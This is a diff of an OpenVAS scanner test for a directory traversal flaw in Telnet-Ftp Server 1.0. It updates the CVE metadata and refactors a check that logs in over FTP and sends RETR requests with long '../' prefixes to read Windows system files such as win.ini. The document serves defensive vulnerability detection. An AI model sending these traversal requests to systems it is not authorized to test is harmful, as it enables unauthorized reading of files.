@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_telnet_ftp_server_dir_trav_vun.nasl 11401 2018-09-15 08:45:50Z cfischer $
+# $Id: gb_telnet_ftp_server_dir_trav_vun.nasl 12105 2018-10-26 05:54:03Z cfischer $
 #
 # Telnet-Ftp Server Directory Traversal Vulnerability
 #
@@ -27,104 +27,114 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.803736");
-  script_version("$Revision: 11401 $");
-  script_tag(name:"cvss_base", value:"5.0");
-  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
+  script_version("$Revision: 12105 $");
+  script_cve_id("CVE-2006-6240", "CVE-2006-6241");
+  script_bugtraq_id(21339, 21340);
+  script_tag(name:"cvss_base", value:"4.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:N/A:N");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-26 07:54:03 +0200 (Fri, 26 Oct 2018) $");
   script_tag(name:"creation_date", value:"2013-08-19 10:32:03 +0530 (Mon, 19 Aug 2013)");
   script_name("Telnet-Ftp Server Directory Traversal Vulnerability");
-
-  script_tag(name:"summary", value:"The host is running Telnet-Ftp server and is prone to directory traversal
-vulnerabilities.");
-  script_tag(name:"vuldetect", value:"Send the crafted directory traversal attack request and check whether it
-is able to read the system file or not.");
-  script_tag(name:"solution", value:"No known solution was made available for at least one year
-since the disclosure of this vulnerability. Likely none will be provided anymore.
-General solution options are to upgrade to a newer release, disable respective
-features, remove the product or replace the product by another one.");
-  script_tag(name:"insight", value:"The flaw exists due to error in handling of file names. It does not properly
-sanitise filenames containing directory traversal sequences that are received
-from an FTP server.");
-  script_tag(name:"affected", value:"Telnet-Ftp Server version 1.0 (Build 1.218)");
-  script_tag(name:"impact", value:"Successful exploitation will allow attackers to read arbitrary files on the
-affected application.");
-  script_tag(name:"solution_type", value:"WillNotFix");
-
-  script_xref(name:"URL", value:"http://1337day.com/exploit/20939");
-  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/telnet-ftp-service-server-10-directory-traversal");
   script_category(ACT_ATTACK);
-  script_tag(name:"qod_type", value:"remote_vul");
   script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
   script_family("FTP");
-  script_dependencies("secpod_ftp_anonymous.nasl");
+  script_dependencies("ftpserver_detect_type_nd_version.nasl", "os_detection.nasl");
   script_require_ports("Services/ftp", 21);
+  script_mandatory_keys("ftp_banner/available", "Host/runs_windows");
+
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/21339");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/21340");
+
+  script_tag(name:"summary", value:"The host is running Telnet-Ftp server and is prone to directory traversal
+  vulnerabilities.");
+
+  script_tag(name:"vuldetect", value:"Send the crafted directory traversal attack request and check whether it
+  is able to read the system file or not.");
+
+  script_tag(name:"solution", value:"No known solution was made available for at least one year
+  since the disclosure of this vulnerability. Likely none will be provided anymore.
+  General solution options are to upgrade to a newer release, disable respective
+  features, remove the product or replace the product by another one.");
+
+  script_tag(name:"insight", value:"The flaw exists due to error in handling of file names. It does not properly
+  sanitise filenames containing directory traversal sequences that are received from an FTP server.");
+
+  script_tag(name:"affected", value:"Telnet-Ftp Server version 1.0 (Build 1.218)");
+
+  script_tag(name:"impact", value:"Successful exploitation will allow attackers to read arbitrary files on the
+  affected application.");
+
+  script_tag(name:"solution_type", value:"WillNotFix");
+  script_tag(name:"qod_type", value:"remote_vul");
+
   exit(0);
 }
 
 include("ftp_func.inc");
+include("host_details.inc");
+include("misc_func.inc");
 
-ftpPort = get_ftp_port(default:21);
+port = get_ftp_port( default:21 );
 
-banner = get_ftp_banner(port:ftpPort);
-if("220 FTP Server ready" >!< banner && "Telnet-Ftp Server" >!< banner){
-  exit(0);
-}
+banner = get_ftp_banner( port:port );
+if( ! banner || ( "220 FTP Server ready" >!< banner && "Telnet-Ftp Server" >!< banner ) )
+  exit( 0 );
 
-soc = open_sock_tcp(ftpPort);
-if(!soc){
-  exit(0);
-}
+soc = open_sock_tcp(port);
+if( ! soc )
+  exit( 0 );
 
-user = get_kb_item("ftp/login");
-pass = get_kb_item("ftp/password");
+user = get_kb_item( "ftp/login" );
+pass = get_kb_item( "ftp/password" );
 
-if(!user){
+if( ! user )
   user = "anonymous";
+
+if( ! pass ) {
+  vtstrings = get_vt_strings();
+  pass = string( vtstrings["lowercase"], "@example.com" );
 }
 
-if(!pass){
-  pass = string("anonymous");
+login_details = ftp_log_in( socket:soc, user:user, pass:pass );
+if( ! login_details ) {
+  ftp_close( socket:soc );
+  exit( 0 );
 }
 
-login_details = ftp_log_in(socket:soc, user:user, pass:pass);
-if(!login_details)
-{
- close(soc);
- exit(0);
+port2 = ftp_get_pasv_port( socket:soc );
+if( ! port2 ) {
+  ftp_close( socket:soc );
+  exit( 0 );
 }
 
-ftpPort2 = ftp_get_pasv_port(socket:soc);
-if(!ftpPort2)
-{
-  close(soc);
+soc2 = open_sock_tcp( port2, transport:get_port_transport( port ) );
+if( ! soc2 ) {
+  ftp_close( socket:soc );
   exit(0);
 }
 
-soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
-if(!soc2)
-{
-  close(soc);
-  exit(0);
-}
+files = traversal_files( "Windows" );
 
-files = make_list("windows/win.ini", "boot.ini", "winnt/win.ini");
-foreach file (files)
-{
+foreach pattern( keys( files ) ) {
+
+  file = files[pattern];
   file = "../../../../../../../../../../../../../../../../" + file;
-  attackreq = string("RETR ", file);
-  send(socket:soc, data:string(attackreq, "\r\n"));
 
-  result = ftp_recv_data(socket:soc2);
+  req = string("RETR ", file);
+  send( socket:soc, data:string( req, "\r\n" ) );
 
-  if("\WINDOWS" >< result || "; for 16-bit app support" >< result
-                                     || "[boot loader]" >< result)
-  {
-    security_message(port:ftpPort);
-    close(soc2);
-    close(soc);
-    exit(0);
+  res = ftp_recv_data( socket:soc2 );
+
+  if( res && match = egrep( string:res, pattern:"(" + pattern + "|\WINDOWS)", icase:TRUE ) ) {
+    ftp_close( socket:soc );
+    close( soc2 );
+    report  = "Used request:  " + req + '\n';
+    report += "Received data: " + match;
+    security_message( port:port, data:report );
+    exit( 0 );
   }
 }
 
-close(soc);
-close(soc2);
+ftp_close( socket:soc );
+close( soc2 );
+exit( 0 );
